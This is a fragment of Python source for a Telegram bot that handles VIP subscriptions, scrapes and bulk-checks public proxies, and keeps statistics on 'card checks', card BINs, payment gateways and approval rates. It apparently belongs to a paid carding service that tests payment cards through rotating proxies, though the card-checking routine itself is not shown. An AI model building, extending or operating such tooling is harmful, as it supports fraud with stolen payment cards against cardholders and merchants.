        f"<b>✅ VIP Removed!\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 User ID: <code>{target_id}</code>\n"
        f"📊 Was: {old_plan} → Now: FREE</b>",
        parse_mode='HTML')

    try:
        bot.send_message(target_id,
            "<b>⚠️ Notice\n"
            "━━━━━━━━━━━━━━━\n"
            "Aapki VIP access remove kar di gayi hai.\n"
            "━━━━━━━━━━━━━━━\n"
            "[⌤] Bot by @yadistan</b>",
            parse_mode='HTML')
    except Exception:
        pass


@bot.message_handler(commands=["checkvip"])
def checkvip_command(message):
    if message.from_user.id != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    parts = message.text.strip().split()
    if len(parts) < 2:
        bot.reply_to(message,
            "<b>📌 Usage: <code>/checkvip &lt;user_id | @username&gt;</code></b>",
            parse_mode='HTML')
        return

    target_id, display = _resolve_user_id(parts[1])
    if target_id is None:
        bot.reply_to(message, f"<b>❌ {display}</b>", parse_mode='HTML')
        return

    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                data = json.load(f)
        except Exception:
            data = {}

    user_data = data.get(str(target_id), {})
    plan  = user_data.get('plan', '𝗙𝗥𝗘𝗘')
    timer = user_data.get('timer', 'none')

    bot.reply_to(message,
        f"<b>🔍 User Info\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 ID: <code>{target_id}</code>\n"
        f"📊 Plan: {plan}\n"
        f"⏳ Expires: {timer}</b>",
        parse_mode='HTML')


@bot.message_handler(commands=["viplist"])
def viplist_command(message):
    """Admin only — list all active VIP users from database + data.json."""
    if message.from_user.id != admin:
        bot.reply_to(message, "<b>❌ Admin only.</b>", parse_mode='HTML')
        return

    now = datetime.now()

    # ── Primary source: database vip_grants table ─────────────────
    db_vips = db.get_vip_users()  # (user_id, username, first_name, days, added_at, expiry)

    # ── Fallback: data.json — catch users not yet in DB ───────────
    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                json_data = json.load(f)
        except Exception:
            json_data = {}

    db_ids = {row[0] for row in db_vips}

    json_vips = []
    for uid_str, udata in json_data.items():
        if udata.get('plan', '') == '𝗩𝗜𝗣':
            uid = int(uid_str)
            if uid not in db_ids:
                json_vips.append((uid, None, None, '?', None, udata.get('timer', 'N/A')))

    all_vips = list(db_vips) + json_vips
    total    = len(all_vips)

    if total == 0:
        bot.reply_to(message,
            "<b>📋 VIP List\n━━━━━━━━━━━━━━━\n"
            "⚠️ Koi bhi VIP user nahi hai abhi.</b>",
            parse_mode='HTML')
        return

    # ── Build message (paginate at 30 per chunk) ──────────────────
    lines = []
    expired_count = 0
    for idx, row in enumerate(all_vips, 1):
        uid, uname, fname, days, added_at, expiry = row

        name_str  = fname or ''
        uname_str = f"@{uname}" if uname else ''
        display   = name_str or uname_str or f"ID:{uid}"

        # Expiry check
        expired_tag = ''
        if expiry and expiry != 'N/A':
            try:
                exp_dt = datetime.strptime(expiry.split('.')[0], "%Y-%m-%d %H:%M")
                if exp_dt < now:
                    expired_tag = '  ⚠️ Expired'
                    expired_count += 1
                else:
                    remain = (exp_dt - now).days
                    expired_tag = f'  ({remain}d left)'
            except Exception:
                pass

        line = (
            f"<b>{idx}.</b> <code>{uid}</code>"
            + (f"  {uname_str}" if uname_str else '')
            + (f"  <i>{name_str}</i>" if name_str else '')
            + f"\n    📅 Exp: <code>{expiry or 'N/A'}</code>{expired_tag}"
        )
        lines.append(line)

    header = (
        f"<b>👑 VIP List  ·  {total} users"
        + (f"  ·  {expired_count} expired" if expired_count else '')
        + "</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
    )
    footer = "\n━━━━━━━━━━━━━━━━━━━━\n<i>[⌤] @yadistan</i>"

    chunk_size = 30
    chunks = [lines[i:i+chunk_size] for i in range(0, len(lines), chunk_size)]

    for idx, chunk in enumerate(chunks):
        part_tag = f"  ·  Part {idx+1}/{len(chunks)}" if len(chunks) > 1 else ''
        msg = header.replace("</b>", f"{part_tag}</b>", 1) + "\n".join(chunk) + footer
        if idx == 0:
            bot.reply_to(message, msg, parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, msg, parse_mode='HTML')


# ================== Proxy Scraper — /scr ==================

PROXY_SOURCES = [
    ("ProxyScrape HTTP",  "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all&limit=100"),
    ("ProxyScrape SOCKS5","https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks5&timeout=5000&country=all&limit=100"),
    ("Geonode HTTP",      "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&protocols=http"),
    ("OpenProxy HTTP",    "https://openproxylist.xyz/http.txt"),
    ("OpenProxy SOCKS5",  "https://openproxylist.xyz/socks5.txt"),
]

def scrape_proxies_from_source(name, url):
    try:
        r = requests.get(url, timeout=12)
        if not r.ok:
            return []
        if 'geonode' in url:
            data = r.json().get('data', [])
            return [f"{p['ip']}:{p['port']}" for p in data]
        lines = r.text.strip().splitlines()
        return [l.strip() for l in lines if ':' in l.strip()]
    except:
        return []

def scrape_all_proxies():
    all_proxies = []
    seen = set()
    for name, url in PROXY_SOURCES:
        proxies = scrape_proxies_from_source(name, url)
        for p in proxies:
            if p not in seen:
                seen.add(p)
                all_proxies.append(p)
    return all_proxies

@bot.message_handler(commands=["scr"])
def scrape_proxy_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'

        args = message.text.split()
        proto_filter = args[1].lower() if len(args) > 1 else 'all'

        msg = bot.reply_to(message,
            "<b>🕷️ 𝗣𝗿𝗼𝘅𝘆 𝗦𝗰𝗿𝗮𝗽𝗲𝗿\n━━━━━━━━━━━━━━━━━━━━\n⏳ 𝗙𝗲𝘁𝗰𝗵𝗶𝗻𝗴 𝗳𝗿𝗼𝗺 𝗺𝘂𝗹𝘁𝗶𝗽𝗹𝗲 𝘀𝗼𝘂𝗿𝗰𝗲𝘀...</b>")

        all_proxies = scrape_all_proxies()

        if proto_filter == 'socks5':
            filtered = [p for p in all_proxies if any(k in p.lower() for k in ['socks'])]
            if not filtered:
                filtered = all_proxies
        elif proto_filter == 'http':
            filtered = all_proxies
        else:
            filtered = all_proxies

        if not filtered:
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                    text="<b>❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱. 𝗧𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿.</b>")
            except:
                pass
            return

        vip_limit = 500
        free_limit = 50
        limit = vip_limit if BL != '𝗙𝗥𝗘𝗘' else free_limit
        display = filtered[:limit]

        proxy_text = '\n'.join(display)

        header = (
            f"<b>🕷️ 𝗣𝗿𝗼𝘅𝘆 𝗦𝗰𝗿𝗮𝗽𝗲𝗿 ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 𝗧𝗼𝘁𝗮𝗹 𝗦𝗰𝗿𝗮𝗽𝗲𝗱: {len(filtered)}\n"
            f"📋 𝗦𝗵𝗼𝘄𝗶𝗻𝗴: {len(display)} {'(VIP Full)' if BL != '𝗙𝗥𝗘𝗘' else '(FREE – max 50)'}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 𝗨𝘀𝗮𝗴𝗲: /scr http | /scr socks5\n"
            f"━━━━━━━━━━━━━━━━━━━━\n</b>"
        )

        if len(proxy_text) > 3000:
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                    text=header + "<b>📄 𝗟𝗶𝘀𝘁 𝗶𝘀 𝗹𝗮𝗿𝗴𝗲 — 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗮𝘀 𝗳𝗶𝗹𝗲...</b>")
            except:
                pass
            from io import BytesIO
            file_bytes = BytesIO(proxy_text.encode())
            file_bytes.name = "proxies_scraped.txt"
            bot.send_document(message.chat.id, file_bytes,
                caption=f"<b>🕷️ 𝗣𝗿𝗼𝘅𝘆 𝗦𝗰𝗿𝗮𝗽𝗲𝗿 ✅ — {len(display)} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>",
                parse_mode='HTML')
        else:
            full_msg = header + f"<code>{proxy_text}</code>\n<b>━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                    text=full_msg)
            except:
                bot.send_message(message.chat.id, full_msg)

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Proxy Checker — /chkpxy ==================

def detect_proxy_type(proxy_str):
    raw = proxy_str.strip().lower()
    if raw.startswith('socks5://'):
        return 'socks5'
    elif raw.startswith('socks4://'):
        return 'socks4'
    elif raw.startswith('http://') or raw.startswith('https://'):
        return 'http'
    parts = raw.split(':')
    if len(parts) >= 2:
        port = parts[1] if parts[1].isdigit() else (parts[3] if len(parts) >= 4 and parts[3].isdigit() else '')
        if port in ['1080', '1081', '9050', '9150']:
            return 'socks5'
    return 'http'

def build_proxy_dict(proxy_str, proto=None):
    raw = proxy_str.strip()
    if any(raw.lower().startswith(p) for p in ['http://', 'https://', 'socks4://', 'socks5://']):
        return {'http': raw, 'https': raw}

    if proto is None:
        proto = detect_proxy_type(raw)

    parts = raw.split(':')
    if len(parts) == 2:
        ip, port = parts
        return {'http': f'{proto}://{ip}:{port}', 'https': f'{proto}://{ip}:{port}'}
    elif len(parts) == 4:
        try:
            int(parts[1])
            ip, port, user, pwd = parts
        except ValueError:
            user, pwd, ip, port = parts
        return {
            'http':  f'{proto}://{user}:{pwd}@{ip}:{port}',
            'https': f'{proto}://{user}:{pwd}@{ip}:{port}'
        }
    else:
        return {'http': f'{proto}://{raw}', 'https': f'{proto}://{raw}'}

def check_single_proxy(proxy_str, timeout=8):
    detected_type = detect_proxy_type(proxy_str)
    protocols_to_try = [detected_type]
    if detected_type == 'http':
        protocols_to_try.append('socks5')
    elif detected_type == 'socks5':
        protocols_to_try.append('http')

    last_error = "Unknown"
    for proto in protocols_to_try:
        try:
            proxy_dict = build_proxy_dict(proxy_str, proto)
            start = time.time()
            r = requests.get("http://ip-api.com/json", proxies=proxy_dict,
                             timeout=timeout, verify=False)
            elapsed = round((time.time() - start) * 1000)
            if r.ok:
                data = r.json()
                country = data.get('country', 'Unknown')
                isp = data.get('isp', 'Unknown')
                ptype = proto.upper()
                return True, elapsed, f"{country} ({ptype})", isp
        except requests.exceptions.ProxyError:
            last_error = f"Proxy refused ({proto})"
        except requests.exceptions.ConnectTimeout:
            last_error = f"Timeout ({proto})"
        except Exception as e:
            last_error = str(e)[:40]

    return False, None, None, last_error

def extract_proxies_from_text(text):
    proxy_list = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if not line or line.startswith('/'):
            continue
        if ':' in line and len(line) >= 7:
            parts = line.split(':')
            if len(parts) >= 2:
                proxy_list.append(line)
    return proxy_list

@bot.message_handler(commands=["chkpxy"])
def check_proxy_command(message):
    def my_function():
        proxy_list = []

        lines = message.text.strip().split('\n')
        first_line_parts = lines[0].split(None, 1)

        if len(first_line_parts) >= 2:
            inline_proxy = first_line_parts[1].strip()
            if inline_proxy:
                proxy_list.append(inline_proxy)
        for l in lines[1:]:
            l = l.strip()
            if l:
                proxy_list.append(l)

        if not proxy_list and message.reply_to_message:
            reply = message.reply_to_message
            if reply.text:
                proxy_list = extract_proxies_from_text(reply.text)
            elif reply.document:
                try:
                    file_info = bot.get_file(reply.document.file_id)
                    file_data = bot.download_file(file_info.file_path)
                    file_text = file_data.decode('utf-8', errors='ignore')
                    proxy_list = extract_proxies_from_text(file_text)
                except Exception as e:
                    bot.reply_to(message, f"<b>❌ 𝗙𝗶𝗹𝗲 𝗿𝗲𝗮𝗱 𝗲𝗿𝗿𝗼𝗿: {str(e)[:50]}</b>")
                    return

        if not proxy_list:
            bot.reply_to(message,
                "<b>🔍 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 (𝗛𝗧𝗧𝗣/𝗦𝗢𝗖𝗞𝗦𝟱/𝗦𝗢𝗖𝗞𝗦𝟰)\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "📌 𝗦𝗶𝗻𝗴𝗹𝗲:\n"
                "<code>/chkpxy 1.2.3.4:8080</code>\n"
                "<code>/chkpxy socks5://1.2.3.4:1080</code>\n\n"
                "📌 𝗕𝘂𝗹𝗸 (𝗣𝗮𝗿𝗮𝗹𝗹𝗲𝗹):\n"
                "<code>/chkpxy\n"
                "1.2.3.4:8080\n"
                "socks5://5.6.7.8:1080\n"
                "9.0.1.2:1080:user:pass</code>\n\n"
                "📌 𝗥𝗲𝗽𝗹𝘆 𝗠𝗼𝗱𝗲:\n"
                "𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 𝗺𝗲𝘀𝘀𝗮𝗴𝗲/𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 /chkpxy\n\n"
                "💡 𝗔𝘂𝘁𝗼-𝗱𝗲𝘁𝗲𝗰𝘁𝘀 𝗛𝗧𝗧𝗣/𝗦𝗢𝗖𝗞𝗦𝟱\n"
                "⚡ 𝗕𝘂𝗹𝗸 𝗰𝗵𝗲𝗰𝗸𝘀 𝟭𝟬 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲\n"
                "━━━━━━━━━━━━━━━━━━━━</b>")
            return

        if len(proxy_list) == 1:
            proxy_str = proxy_list[0]
            wait_msg = bot.reply_to(message,
                f"<b>🔍 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝘆...\n⏳ <code>{proxy_str}</code></b>")
            alive, ms, country, info = check_single_proxy(proxy_str)
            if alive:
                result_text = (
                    f"<b>🔍 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"[ϟ] 𝗣𝗿𝗼𝘅𝘆: <code>{proxy_str}</code>\n"
                    f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: ✅ 𝗟𝗜𝗩𝗘\n"
                    f"[ϟ] 𝗦𝗽𝗲𝗲𝗱: {ms}ms\n"
                    f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}\n"
                    f"[ϟ] 𝗜𝗦𝗣: {info}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
                )
            else:
                result_text = (
                    f"<b>🔍 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"[ϟ] 𝗣𝗿𝗼𝘅𝘆: <code>{proxy_str}</code>\n"
                    f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: ❌ 𝗗𝗘𝗔𝗗\n"
                    f"[ϟ] 𝗥𝗲𝗮𝘀𝗼𝗻: {info}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"
                )
            try:
                bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id,
                    text=result_text)
            except:
                pass
            return

        MAX_BULK = 500
        total = len(proxy_list)
        if total > MAX_BULK:
            proxy_list = proxy_list[:MAX_BULK]
            total = MAX_BULK

        live_list = []
        dead_count = [0]
        checked = [0]
        results_lines = []
        bulk_lock = threading.Lock()
        stopped = [False]

        THREADS = min(10, total)

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))

        id = message.from_user.id
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}

        msg = bot.reply_to(message,
            f"<b>🔍 𝗕𝘂𝗹𝗸 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⚡\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📋 𝗧𝗼𝘁𝗮𝗹: {total} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀\n"
            f"🧵 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {THREADS}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴...</b>", reply_markup=stop_kb)

        def build_bulk_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            with bulk_lock:
                c = checked[0]
                ll = len(live_list)
                dc = dead_count[0]
                last_lines = list(results_lines[-12:])
                last_live = list(live_list[-10:])
            header = (
                f"<b>🔍 𝗕𝘂𝗹𝗸 𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⚡ | {status}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 {c}/{total} | ✅ {ll} 𝗟𝗶𝘃𝗲 | ❌ {dc} 𝗗𝗲𝗮𝗱 | 🧵 {THREADS}x\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
            )
            body = "\n".join(last_lines)
            footer_hits = ""
            if last_live:
                footer_hits = (
                    f"\n━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ 𝗟𝗜𝗩𝗘 𝗣𝗥𝗢𝗫𝗜𝗘𝗦:\n" +
                    "".join(f"✅ <code>{p}</code>\n" for p in last_live)
                )
            return header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>"

        from queue import Queue as TQueue
        proxy_queue = TQueue()
        for p in proxy_list:
            proxy_queue.put(p)

        def worker_thread():
            while not proxy_queue.empty():
                if stopped[0] or stopuser.get(f'{id}', {}).get('status') == 'stop':
                    stopped[0] = True
                    return
                try:
                    proxy_str = proxy_queue.get_nowait()
                except:
                    return

                alive, ms, country, info = check_single_proxy(proxy_str, timeout=8)

                with bulk_lock:
                    checked[0] += 1
                    if alive:
                        live_list.append(proxy_str)
                        results_lines.append(f"✅ <code>{proxy_str}</code> | {ms}ms | {country}")
                    else:
                        dead_count[0] += 1
                        results_lines.append(f"❌ <code>{proxy_str}</code> | {info}")

                proxy_queue.task_done()

        workers = []
        for _ in range(THREADS):
            t = threading.Thread(target=worker_thread, daemon=True)
            t.start()
            workers.append(t)

        last_update = time.time()
        while any(t.is_alive() for t in workers):
            time.sleep(0.5)
            now = time.time()
            if now - last_update >= 2:
                last_update = now
                if stopped[0]:
                    break
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                        text=build_bulk_msg(), reply_markup=stop_kb)
                except:
                    pass

        for t in workers:
            t.join(timeout=1)

        minux_keyboard = types.InlineKeyboardMarkup()
        minux_keyboard.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))

        final_status = "🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗" if stopped[0] else "✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                text=build_bulk_msg(final_status), reply_markup=minux_keyboard)
        except:
            pass

        if live_list and len(live_list) >= 1:
            from io import BytesIO
            live_text = "\n".join(live_list)
            file_bytes = BytesIO(live_text.encode())
            file_bytes.name = "live_proxies.txt"
            bot.send_document(message.chat.id, file_bytes,
                caption=f"<b>✅ {len(live_list)} 𝗟𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 (𝗼𝘂𝘁 𝗼𝗳 {total})\n[⌤] 𝗗𝗲𝘃 𝗯𝘆: YADISTAN - 🍀</b>",
                parse_mode='HTML')

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    id = call.from_user.id
    try:
        stopuser[f'{id}']['status'] = 'stop'
    except Exception:
        stopuser[f'{id}'] = {'status': 'stop'}
    bot.answer_callback_query(call.id, "🛑 Stopped!", show_alert=False)
    try:
        orig = call.message.text or call.message.caption or ""
        first_line = orig.split('\n')[0] if orig else "Checker"
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=f"{first_line}\n\n<b>🛑 STOPPED by user.</b>",
            parse_mode='HTML'
        )
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'ping_inline')
def ping_inline_callback(call):
    import time as _time
    t1 = _time.time()
    bot.answer_callback_query(call.id, "Pinging...", show_alert=False)
    latency = round((_time.time() - t1) * 1000)
    bot.answer_callback_query(call.id, f"🏓 Pong! Latency: {latency}ms", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'stats_inline')
def stats_inline_callback(call):
    try:
        total_users   = db.get_user_count()
        total_checks  = db.get_card_checks_count()
        total_queries = db.get_all_queries_count()
        today         = db.get_today_stats()
        today_checks  = today.get('checks', 0)
        today_live    = today.get('approved', 0)
        today_active  = today.get('active_users', 0)
        bot.answer_callback_query(
            call.id,
            f"📊 Bot Statistics\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👥 Total Users   : {total_users}\n"
            f"🔍 Total Checks  : {total_checks}\n"
            f"📋 Total Queries : {total_queries}\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📅 Today Checks  : {today_checks}\n"
            f"✅ Today Live    : {today_live}\n"
            f"🧑 Today Active  : {today_active}",
            show_alert=True
        )
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ Stats error: {str(e)[:80]}", show_alert=True)

@bot.message_handler(commands=["dbstats"])
def dbstats_command(message):
    id = message.from_user.id
    if id != admin and id != 1640135020:
        bot.reply_to(message, "<b>❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.</b>")
        return

    total_users = db.get_user_count()
    total_queries = db.get_all_queries_count()
    total_checks = db.get_card_checks_count()
    today = db.get_today_stats()
    gw_stats = db.get_gateway_stats()

    gw_text = ""
    for gw, total, approved in gw_stats:
        rate = (approved / total * 100) if total > 0 else 0
        gw_text += f"  ├ {gw}: {total} checks ({approved} approved, {rate:.1f}%)\n"

    top_users = db.get_top_users(5)
    top_text = ""
    for uid, uname, fname, plan, qcount in top_users:
        name = uname or fname or str(uid)
        top_text += f"  ├ @{name} [{plan}]: {qcount} queries\n"

    stats_msg = f"""<b>📊 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀
━━━━━━━━━━━━━━━━━━━━
👥 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {total_users}
💬 𝗧𝗼𝘁𝗮𝗹 𝗤𝘂𝗲𝗿𝗶𝗲𝘀: {total_queries}
💳 𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱 𝗖𝗵𝗲𝗰𝗸𝘀: {total_checks}

📅 𝗧𝗼𝗱𝗮𝘆:
  ├ 𝗤𝘂𝗲𝗿𝗶𝗲𝘀: {today['queries']}
  ├ 𝗖𝗵𝗲𝗰𝗸𝘀: {today['checks']}
  ├ 𝗔𝗰𝘁𝗶𝘃𝗲 𝗨𝘀𝗲𝗿𝘀: {today['active_users']}
  └ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: {today['approved']}

🔗 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 𝗦𝘁𝗮𝘁𝘀:
{gw_text if gw_text else '  └ No data yet'}

🏆 𝗧𝗼𝗽 𝗨𝘀𝗲𝗿𝘀:
{top_text if top_text else '  └ No data yet'}
━━━━━━━━━━━━━━━━━━━━</b>"""

    bot.reply_to(message, stats_msg)

@bot.message_handler(commands=["history"])
def history_command(message):
    id = message.from_user.id
    log_command(message, query_type='command')

    checks = db.get_user_card_checks(id, limit=10)
    if not checks:
        bot.reply_to(message, "<b>📭 𝗡𝗼 𝗰𝗵𝗲𝗰𝗸 𝗵𝗶𝘀𝘁𝗼𝗿𝘆 𝗳𝗼𝘂𝗻𝗱.</b>")
        return

    history_text = "<b>📜 𝗬𝗼𝘂𝗿 𝗟𝗮𝘀𝘁 10 𝗖𝗵𝗲𝗰𝗸𝘀:\n━━━━━━━━━━━━━━━━━━━━\n</b>"
    for i, (card_bin, gateway, result, ts, exec_time) in enumerate(checks, 1):
        exec_str = f"{exec_time:.1f}s" if exec_time else "N/A"
        history_text += f"<b>{i}. 💳 {card_bin} | {gateway}\n   ├ {result}\n   ├ ⏱ {exec_str}\n   └ 📅 {ts}\n\n</b>"

    bot.reply_to(message, history_text)

@bot.message_handler(commands=["dbexport"])
def dbexport_command(message):
    id = message.from_user.id
    if id != admin and id != 1640135020:
        bot.reply_to(message, "<b>❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.</b>")
        return

    try:
        csv_file = db.export_to_csv()
        if csv_file:
            with open(csv_file, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="<b>📊 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗘𝘅𝗽𝗼𝗿𝘁 (CSV)</b>")
            os.remove(csv_file)

        json_file = db.export_to_json()
        if json_file:
            with open(json_file, 'rb') as f:
                bot.send_document(message.chat.id, f, caption="<b>📊 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗘𝘅𝗽𝗼𝗿𝘁 (JSON)</b>")
            os.remove(json_file)
    except Exception as e:
        bot.reply_to(message, f"<b>❌ 𝗘𝘅𝗽𝗼𝗿𝘁 𝗲𝗿𝗿𝗼𝗿: {str(e)}</b>")

@bot.message_handler(commands=["dbbackup"])
def dbbackup_command(message):
    id = message.from_user.id
    if id != admin and id != 1640135020:
        bot.reply_to(message, "<b>❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.</b>")
        return

    backup_file = db.backup_database()
    if backup_file:
        with open(backup_file, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"<b>💾 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲 𝗕𝗮𝗰𝗸𝘂𝗽\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}</b>")
    else:
        bot.reply_to(message, "<b>❌ 𝗕𝗮𝗰𝗸𝘂𝗽 𝗳𝗮𝗶𝗹𝗲𝗱.</b>")

@bot.message_handler(commands=["dbsearch"])
def dbsearch_command(message):
    id = message.from_user.id
    if id != admin and id != 1640135020:
        bot.reply_to(message, "<b>❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.</b>")
        return

    try:
        search_term = message.text.split(' ', 1)[1]
    except IndexError:
        bot.reply_to(message, "<b>𝗨𝘀𝗮𝗴𝗲: /dbsearch &lt;term&gt;</b>")
        return

    results = db.search_queries(search_term)
    if not results:
        bot.reply_to(message, f"<b>🔍 𝗡𝗼 𝗿𝗲𝘀𝘂𝗹𝘁𝘀 𝗳𝗼𝗿 '{search_term}'</b>")
        return

    text = f"<b>🔍 𝗦𝗲𝗮𝗿𝗰𝗵 𝗿𝗲𝘀𝘂𝗹𝘁𝘀 𝗳𝗼𝗿 '{search_term}':\n━━━━━━━━━━━━━━━━━━━━\n</b>"
    for i, row in enumerate(results[:10], 1):
        if len(row) == 4:
            uid, query, resp, ts = row
            text += f"<b>{i}. 👤 {uid}\n   ├ {query[:50]}\n   └ 📅 {ts}\n\n</b>"
        else:
            query, resp, ts = row
            text += f"<b>{i}. {query[:50]}\n   └ 📅 {ts}\n\n</b>"

    bot.reply_to(message, text)

@bot.message_handler(commands=["ping"])
def ping_command(message):
    log_command(message, query_type='command')
    sent = bot.reply_to(message, "🏓 <b>Pinging...</b>")
    latency_ms = round((time.time() - message.date) * 1000)
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=sent.message_id,
        text=(
            "┌─────────────────────────┐\n"
            "│  🏓  <b>PONG!</b>                 │\n"
            "├─────────────────────────┤\n"
            f"│  ⚡ Latency: <b>{latency_ms} ms</b>       │\n"
            "│  ✅ Status:  <b>Online</b>        │\n"
            "│  🤖 Bot:     <b>Responsive</b>    │\n"
            "└─────────────────────────┘"
        ),
        parse_mode="HTML"
    )


def _get_public_ip():
    """Get server public IP."""
    try:
        return requests.get("https://api.ipify.org", timeout=5).text.strip()
    except Exception:
        return "N/A"

def _get_location_info(ip=None):
    """Get geo/ISP info for server IP. Primary: ipwho.is  Fallback: ipinfo.io  Final: ip-api.com (HTTP)."""
    _ip = ip if (ip and ip != "N/A") else ""

    # ── Primary: ipwho.is ──────────────────────────────────────────
    try:
        r = requests.get(f"https://ipwho.is/{_ip}", timeout=6)
        d = r.json()
        if d.get("success"):
            flag     = (d.get("flag") or {}).get("emoji") or _flag(d.get("country_code", ""))
            conn     = d.get("connection") or {}
            tz       = d.get("timezone") or {}
            return {
                "city":     d.get("city", "—"),
